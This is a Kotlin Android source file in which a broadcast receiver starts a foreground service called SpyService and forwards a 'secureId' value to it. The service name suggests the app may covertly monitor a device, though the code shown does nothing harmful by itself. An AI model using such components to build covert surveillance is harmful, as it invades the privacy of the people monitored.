package com.kas.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log

class MyBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Intent(context, SpyService::class.java).let {
            it.putExtra("secureId", intent.extras?.getString("secureId"))
            context.startForegroundService(it)
        }

    }
}